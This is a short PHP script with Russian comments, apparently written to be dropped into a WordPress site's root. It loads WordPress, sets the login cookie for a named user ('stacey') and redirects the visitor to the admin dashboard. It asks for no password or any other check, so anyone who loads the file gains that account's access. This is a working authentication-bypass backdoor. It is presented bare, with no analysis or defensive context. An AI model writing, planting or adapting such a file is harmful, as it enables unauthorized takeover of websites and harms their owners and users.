<?php

$mr = $_SERVER['DOCUMENT_ROOT'];

@chdir($mr);

if (file_exists('wp-load.php')) {
    include 'wp-load.php';

    // Укажите логин пользователя, под которым нужно авторизоваться
    $username = 'stacey'; // Замените 'example_user' на логин нужного пользователя

    // Получаем пользователя по логину
    $user = get_user_by('login', $username);

    if ($user) {
        // Устанавливаем cookie для авторизации
        wp_set_auth_cookie($user->ID);

        // Перенаправляем в админку
        wp_redirect(admin_url());
        die();
    } else {
        die('Ошибка: Пользователь с указанным логином не найден.');
    }
} else {
    die('Failed to load');
}

?>
